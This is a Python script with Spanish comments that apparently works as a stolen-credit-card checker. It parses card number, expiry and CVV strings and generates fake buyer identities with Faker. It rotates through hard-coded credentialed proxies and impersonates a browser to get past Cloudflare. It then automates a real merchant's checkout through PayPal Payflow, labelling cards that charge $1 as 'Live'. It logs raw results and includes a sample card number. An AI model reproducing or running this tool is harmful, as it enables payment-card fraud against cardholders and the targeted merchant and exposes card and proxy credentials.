import requests, json, cloudscraper, random, time, re, base64, traceback, urllib.parse
try:
    from curl_cffi.requests import Session as CurlSession
    HAS_CURL = True
except ImportError:
    HAS_CURL = False
    CurlSession = None
from datetime import datetime, timedelta
from faker import Faker

TIMEOUT = 15
TIMEOUT_PAYFLOW = 25

# === Proxies ===
PROXIES = [
    "http://iqgbcwxy:v2krgc0qmmv5@45.39.115.193:5604",
    "http://iqgbcwxy:v2krgc0qmmv5@107.181.142.44:5637",
    "http://iqgbcwxy:v2krgc0qmmv5@192.210.191.139:6125",
    "http://iqgbcwxy:v2krgc0qmmv5@23.236.196.141:6231",
]

def _normalize_proxy(proxy: str) -> str | None:
    if not proxy:
        return None
    proxy = proxy.strip()
    # corrige formato malformado https://user:pass:host:port -> https://user:pass@host:port
    if "://" in proxy:
        scheme, rest = proxy.split("://", 1)
        if "@" not in rest and rest.count(":") == 3:
            user, pwd, host, port = rest.split(":")
            rest = f"{user}:{pwd}@{host}:{port}"
        # usa http para el proxy dict (más compatible)
        if scheme not in ("http", "https"):
            scheme = "http"
        # normaliza a http
        return f"http://{rest}" if scheme in ("http", "https") else proxy
    # sin esquema
    if "@" not in proxy and proxy.count(":") == 3:
        user, pwd, host, port = proxy.split(":")
        return f"http://{user}:{pwd}@{host}:{port}"
    if not proxy.startswith("http"):
        return f"http://{proxy}"
    return proxy

def _get_random_proxy(exclude=None) -> str:
    exclude = exclude or set()
    avail = [p for p in PROXIES if p not in exclude]
    if not avail:
        avail = PROXIES
    return random.choice(avail)

def _mask_proxy(proxy: str | None) -> str:
    if not proxy:
        return "direct"
    try:
        # extrae host:port sin credenciales
        if "@" in proxy:
            return proxy.split("@")[-1]
        if "://" in proxy:
            return proxy.split("://")[-1]
        return proxy
    except:
        return "***"

def _make_session(proxy=None):
    cur = _normalize_proxy(proxy)
    if HAS_CURL:
        kwargs = {"impersonate": "chrome120"}
        if cur:
            kwargs["proxies"] = {"http": cur, "https": cur}
        return CurlSession(**kwargs)
    else:
        seccion = cloudscraper.create_scraper(browser={'browser': 'chrome', 'platform': 'ios', 'mobile': True}, delay=2)
        if cur:
            seccion.proxies.update({"http": cur, "https": cur})
        return seccion

def _extract_token_num(txt: str):
    import re, urllib.parse
    # intenta extraer token y recordids de control HTML (case-insensitive)
    m = re.search(r'token=([^&]+)', txt, re.I)
    n = re.search(r'recordids=([^&]+)', txt, re.I)
    tok = urllib.parse.unquote(m.group(1).split('"')[0].split("'")[0].split('\\')[0].split('&')[0].strip()) if m else None
    num = n.group(1).split('"')[0].split("'")[0].split('\\')[0].split('&')[0].strip() if n else None
    return tok, num

def parse(text: str, a: str, b: str) -> str:
    try:
        return text.split(a)[1].split(b)[0]
    except (IndexError, AttributeError):
        return None

def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return None

def _is_cf_block(text: str, status_code: int = None) -> bool:
    if status_code == 403:
        return True
    if status_code == 504:
        return True
    markers = ["just a moment","cf-challenge","challenges.cloudflare.com","attention required","cf_bm","__cf_chl","gateway time-out","origin_gateway_timeout","cloudflare"]
    if not text:
        return False
    low = text.lower()
    return any(m in low for m in markers)

def _check_response(resp, label: str):
    if resp is None:
        return False, f"{label}: sin respuesta"
    code = getattr(resp, 'status_code', None)
    txt = getattr(resp, 'text', '') or ''
    if _is_cf_block(txt, code):
        detail = txt[:600].replace('\n',' ') if txt else ''
        if code == 504:
            return False, f"{label}: Gateway time-out 504 Cloudflare - origen nigelbdesign no responde. Reintentar en 120s. Status={code} | {detail[:300]}"
        return False, f"{label}: Bloqueo Cloudflare detectado (Just a moment/403/504). IP posiblemente rate-limited/baneada. Requiere proxy residencial o Browserless. Status={code} | {detail[:300]}"
    if code is not None and code >= 400 and code in (403,503,429,504,520,521,522,523,524):
        return False, f"{label}: HTTP {code} - posible bloqueo Cloudflare/WAF | {txt[:400].replace(chr(10),' ') }"
    if not txt or len(txt.strip()) == 0:
        return False, f"{label}: respuesta vacia (len=0) Status={code}"
    return True, None

def procesar_y_validar(card):
    def es_fecha_anterior(mes, ano):
        fecha_actual = datetime.now().strftime('%Y-%m')
        fecha_proporcionada = f"{'20'+ano}-{mes:02}"
        return fecha_proporcionada >= fecha_actual
    KEYS = "/#%&()=?¿!¡*[]{}-_.:,;|@+"
    for KEY in KEYS:
        card = card.replace(KEY, "|")
    card = card.replace(" ", "|")    
    match = re.search(r'\d{15,16}\|\d{2}\|\d{2,4}\|\d{3,4}', card)
    if not match:
        return None    
    values = card.split("|")
    if len(values) < 4:
        return None    
    cc_number = values[0]
    mes = values[1]
    ano = values[2]
    ano = ano[2:] if len(ano) > 2 else ano
    cvv = values[3][0:4]    
    if not es_fecha_anterior(mes, ano):
        return None    
    return cc_number, mes, ano, cvv

def _close_session(sess):
    if sess is None:
        return
    try:
        sess.close()
    except Exception:
        pass

def _nbd_single(card, proxy=None):
    seccion = None
    try:
        resultado = procesar_y_validar(card)
        if resultado is None:
            return f"card -» {card}\nStatus -» Fechas Invalidas \nResult -» Fechas Invalidas\n"
        else:
            cc_number, mes, ano, cvv = resultado

        faker = Faker()
        nombre= faker.first_name()
        apellido= faker.last_name()
        email = f'{nombre}{apellido}.{cc_number[6:12]}%40icloud.com'
        zip_code = faker.zipcode()
        street = faker.address()
        city = faker.city()
        state_abbr = faker.state_abbr()
        phone = ''.join([str(random.randint(0, 9)) for _ in range(10)])

        cur_proxy = _normalize_proxy(proxy)
        seccion = _make_session(proxy=cur_proxy)

        inicio=datetime.now()

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }

        r1 = seccion.get(
            'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r1, "r1 GET nigelbdesign")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://nigelbdesign.com',
            'priority': 'u=1, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        json_data = {
            'items': [
                {
                    'ItemID': 1062,
                    'Quantity': '0',
                    'CategoryID': 1021,
                    'Inventory': None,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 1,
                },
            ],
            'componentID': '1070',
            'type': '1',
            'addedFromPage': 'ItemDetail',
        }
        r2 = seccion.post('https://nigelbdesign.com/addtocart',   headers=headers, json=json_data, timeout=TIMEOUT)
        ok, err = _check_response(r2, "r2 POST addtocart")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"
        token, num = _extract_token_num(r2.text)
        # fallback a parse legacy
        if not token:
            token = parse(r2.text,'https://cart.thomasnet-navigator.com/cbcheckout/ViewCart?Token=','","orderMinQty"')
            if not token:
                token = parse(r2.text,'https://cart.thomasnet-navigator.com/cbcheckout/viewcart?token=','"')
        if not num:
            num = parse(r2.text,'recordids=','\\"')
        if not token or not num:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            detail = r2.text[:600].replace('\n',' ')
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: r2 sin Token/recordids - respuesta inesperada (504/CF?) | {detail}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'referer': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'recordids': num,
        }
        r3 = seccion.get('https://nigelbdesign.com/addtocart', params=params,   headers=headers, timeout=TIMEOUT)
        ok, err = _check_response(r3, "r3 GET addtocart")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'es-419,es;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'proceedtocheckout',
            'items': [
                {
                    'ItemID': 1062,
                    'PreviousQuantity': 1,
                    'Quantity': '1',
                    'OrderID': 1334,
                    'RecordID': 1409,
                    'MinOrderQty': 1,
                    'ItemNumber': 'NB-CIS',
                    'OrderType': 'Order',
                },
            ],
            'shipping': {
                'TaxExempt': '',
            },
        }
        r4 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r4, "r4 POST viewcart proceedtocheckout")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r5 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r5, "r5 GET shippingbilling")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'step1estimate',
            'items': None,
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018 Meadowview Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': '',
                        'AddressNumber': '',
                    },
                ],
                'FreightOptions': [],
                'IsCheckout': True,
            },
        }
        r6 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/viewcart',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r6, "r6 POST step1estimate")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/json; charset=UTF-8',
            'origin': 'https://cart.thomasnet-navigator.com',
            'priority': 'u=1, i',
            'referer': f'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling?token={token}&returnurl=https%3A%2F%2Fnigelbdesign.com%2Fitem%2Fanti-vibration-for-ptz-cameras%2Fcisco-style-camera-anti-vibration-platform-mounts%2Fnb-cis',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        json_data = {
            'actionmode': 'save',
            'shipping': {
                'Addresses': [
                    {
                        'AddressType': '2',
                        'FirstName': nombre,
                        'LastName': apellido,
                        'CompanyName': '',
                        'Address1': '2018%20Meadowview%20Drive',
                        'Address2': '',
                        'Address3': '',
                        'City': 'Ridgeway',
                        'StateShortName': 'MO',
                        'Region': '',
                        'State/Province_-_Shipping': '',
                        'CountryShortName': 'US',
                        'Zip': '64481',
                        'Phone': phone,
                        'Fax': '',
                        'Email': email,
                        'AddressNumber': '',
                    },
                ],
                'FreightShippings': [],
                'GeneralShippings': [],
                'IsInternational': False,
                'IsCheckout': True,
                'IsFreight': False,
                'ErrorMessage': '',
                'FreightOptions': [],
                'TaxExempt': None,
                'ShippingTotal': None,
                'HandlingTotal': None,
                'TaxTotal': 0,
                'Total': None,
                'GeneralShippingKey': '128-Actual-41.71-0-4-0-0',
                'IsOnlyFreightServices': False,
                'ShippingAccountNumber': '',
                'IsValidAddress': True,
            },
            'isSaveAddress': False,
        }
        r7 = seccion.post(
            'https://cart.thomasnet-navigator.com/cbcheckout/shippingbilling',
            params=params,
            headers=headers,
            json=json_data,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r7, "r7 POST save")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'es-419,es;q=0.9',
            'priority': 'u=0, i',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'token': token,
            'returnurl': 'https://nigelbdesign.com/item/anti-vibration-for-ptz-cameras/cisco-style-camera-anti-vibration-platform-mounts/nb-cis',
        }
        r8 = seccion.get(
            'https://cart.thomasnet-navigator.com/cbcheckout/paymentoptions',
            params=params,
            headers=headers,
            timeout=TIMEOUT,
        )
        ok, err = _check_response(r8, "r8 GET paymentoptions")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"
        securetokenid = parse(r8.text,'paypal.com/?SecureTokenID=','&amp')
        securetoken = parse(r8.text,'SecureToken=','"')
        if not securetokenid or not securetoken:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            detail = r8.text[:600].replace('\n',' ')
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: r8 sin SecureToken - respuesta inesperada | {detail}\n{tiempo} segundos!\n"

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'Accept-Language': 'es-419,es;q=0.9',
            'Connection': 'keep-alive',
            'Referer': 'https://cart.thomasnet-navigator.com/',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        params = {
            'SecureTokenID': securetokenid,
            'SecureToken': securetoken,
        }
        r9 = seccion.get('https://payflowlink.paypal.com/', params=params,   headers=headers, timeout=TIMEOUT_PAYFLOW)
        ok, err = _check_response(r9, "r9 GET payflowlink")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"
        csrf = parse(r9.text,'name="CSRF_TOKEN" type="hidden" value="','"')
        if not csrf:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            detail = r9.text[:600].replace('\n',' ')
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: r9 sin CSRF_TOKEN - payflowlink no retorno form | {detail}\n{tiempo} segundos!\n"

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://payflowlink.paypal.com',
            'priority': 'u=0, i',
            'referer': f'https://payflowlink.paypal.com/?SecureTokenID={securetokenid}&SecureToken={securetoken}',
            'sec-ch-ua': '"Chromium";v="142", "Google Chrome";v="142", "Not_A Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'iframe',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'active',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        }
        data = [
            ('subaction', ''),
            ('CARDNUM', '' +cc_number+ ''),
            ('EXPMONTH', '' +mes+ ''),
            ('EXPYEAR', '' +ano+ ''),
            ('startdate_month', ''),
            ('startdate_year', ''),
            ('issue_number', ''),
            ('METHOD', 'C'),
            ('PAYMETHOD', 'C'),
            ('FIRST_NAME', nombre),
            ('LAST_NAME', apellido),
            ('template', ''),
            ('ADDRESS', '2018+Meadowview+Drive++'),
            ('CITY', 'Ridgeway'),
            ('STATE', 'MO'),
            ('ZIP', '64481'),
            ('COUNTRY', 'US'),
            ('PHONE', ''),
            ('EMAIL', ''),
            ('SHIPPING_FIRST_NAME', nombre),
            ('SHIPPING_LAST_NAME', apellido),
            ('ADDRESSTOSHIP', '2018+Meadowview+Drive++'),
            ('CITYTOSHIP', 'Ridgeway'),
            ('STATETOSHIP', 'MO'),
            ('ZIPTOSHIP', '64481'),
            ('COUNTRYTOSHIP', 'US'),
            ('PHONETOSHIP', ''),
            ('EMAILTOSHIP', ''),
            ('TYPE', 'A'),
            ('SHIPAMOUNT', '0.00'),
            ('TAX', '0.00'),
            ('VERBOSITY', 'HIGH'),
            ('flag3dSecure', ''),
            ('CURRENCY', 'USD'),
            ('STATE', 'MO'),
            ('swipeData', '0'),
            ('SECURETOKEN', f'{securetoken}'),
            ('SECURETOKENID', f'{securetokenid}'),
            ('PARMLIST', ''),
            ('MODE', ''),
            ('CSRF_TOKEN', f'{csrf}'),
            ('referringTemplate', 'minlayout'),
        ]
        r10 = seccion.post('https://payflowlink.paypal.com/processTransaction.do', headers=headers, data=data, timeout=TIMEOUT_PAYFLOW)
        ok, err = _check_response(r10, "r10 POST processTransaction")
        if not ok:
            tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'
            return f"Card: {card}\nStatus: ⚠️ Error\nResult: {err}\n{tiempo} segundos!\n"
        resptext = parse(r10.text,'name="RESPTEXT" value="','"')
        respmsg = parse(r10.text,'name="RESPMSG" value="','"')
        avsdata = parse(r10.text,'name="AVSDATA" value="','"')
        source = r10.text
        
        tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}'

        with open("NBD Datos.txt", 'a',encoding='utf-8') as archivo:
            archivo.write(cc_number[:6]+'---'+source+'\n')

        if 'Approved' in source:
            status, result = "✅ Live", "Live Charged 1usd"

        elif 'Insufficient funds available' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>')
            status, result = "💸 Fondos Insuficientes", f"{msg} | AVS: {avsdata}"

        elif 'RESPMSG' in source:
            msg = parseX(source, 'name="RESPMSG" value="', '"/>')
            status, result = "❌ Dead", f"{msg} | AVS: {avsdata}"

        else:
            status, result = "⚠️ Error", "Avisar Al Admin "

        message_to_send = f"Card: {card}\nStatus: {status}\nResult: {result}\n{tiempo} segundos!\n"
        return message_to_send

    except Exception as e:
        err_detail = str(e) or repr(e)
        low = err_detail.lower()
        print(f"[payflow proxy={_mask_proxy(proxy)}] {type(e).__name__}: {err_detail}\n{traceback.format_exc()}")
        if "timeout" in low or "timed out" in low or "read timeout" in low:
            hint = f"Timeout - payflow/nigelbdesign tardo demasiado (posible WAF/CF o payflowlink lento). Reintentar. | {err_detail[:250]}"
        elif "max retries" in low:
            hint = f"Desconexion/Max retries - nigelbdesign.com no responde o bloqueo CF | {err_detail[:250]}"
        elif "httpsconnectionpool" in low:
            hint = f"Desconexion - {err_detail[:250]}"
        elif "getaddrinfo" in low or "name or service not known" in low:
            hint = f"Error DNS - {err_detail[:250]}"
        elif "cloudflare" in low or "just a moment" in low:
            hint = f"Bloqueo Cloudflare - {err_detail[:250]}"
        elif "list index out of range" in low:
            hint = f"Parse fallo - respuesta inesperada sin Token/CSRF (504/CF?) | {err_detail[:250]}"
        elif "proxy" in low or "tunnel" in low or "socks" in low:
            hint = f"Error Proxy - {err_detail[:250]}"
        else:
            hint = f"{type(e).__name__}: {err_detail[:250]}"
        tiempo = f'Tiempo:{float((datetime.now() - inicio).total_seconds()):0.2f}' if 'inicio' in locals() else 'Tiempo:0.00'
        message_to_send = f"Card: {card}\nStatus: ⚠️ Error\nResult: {hint}\n{tiempo} segundos!\n"
        return message_to_send
    finally:
        _close_session(seccion)

def nbd(card, proxy=None):
    # wrapper con rotación de proxies si no se pasa proxy explícito
    if proxy:
        norm = _normalize_proxy(proxy)
        return _nbd_single(card, proxy=norm)
    # intenta hasta 3 proxies distintos si hay 504/CF
    tried = set()
    last_result = None
    for attempt in range(3):
        cur = _get_random_proxy(exclude=tried)
        tried.add(cur)
        result = _nbd_single(card, proxy=cur)
        # si es error retryable (504/CF/proxy) prueba siguiente
        if any(k in result for k in ("Gateway time-out 504", "Bloqueo Cloudflare", "Error Proxy", "Desconexion/Max retries", "Timeout -")):
            last_result = result
            # si no es último intento, espera breve y reintenta
            if attempt < 2:
                time.sleep(random.uniform(0.5, 1.2))
                continue
            return result
        return result
    return last_result or _nbd_single(card, proxy=_get_random_proxy())

cards ='''5401040078503174|09|30|967'''

if __name__ == "__main__":
    card_lines = cards.split('\n')
    for card in card_lines:
          # prueba sin proxy explícito usa rotación
          message_to_send = nbd(card)
          print(message_to_send)
